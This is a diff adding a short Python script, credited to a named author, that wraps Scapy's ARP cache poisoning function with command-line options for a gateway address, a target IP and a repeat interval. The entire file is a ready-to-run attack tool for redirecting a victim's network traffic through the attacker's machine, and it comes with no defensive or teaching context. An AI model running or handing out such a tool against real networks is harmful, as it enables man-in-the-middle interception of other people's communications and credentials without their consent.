@@ -1,0 +1,26 @@
+#!/usr/bin/env python
+# Simple Arp Cache Poisoner Using Scapy
+# Written By Reza Mansouri (dr.web)
+# Email : securmind@Gmail.Com
+# www.r-mansouri.ir
+#
+from scapy.all import *
+import optparse
+
+def main():
+    parse=optparse.OptionParser()
+    parse.add_option('-g', '--getway', help="Getway Address")
+    parse.add_option('-t', '--target', help="Target IP Address")
+    parse.add_option('-s', '--second', help="Second Intervals(Default = 1)", default=1)
+    opt, args = parse.parse_args()
+    opt.second = int(opt.second)
+    try:
+        if opt.getway and opt.target:
+            arpcachepoison(opt.getway, opt.target, opt.second)
+        else:
+            print "Error : Invalid Option !"
+            exit(1)
+    except(KeyboardInterrupt):
+        print "\nCtrl + C Detected.\n"
+if __name__ == '__main__':
+    main()
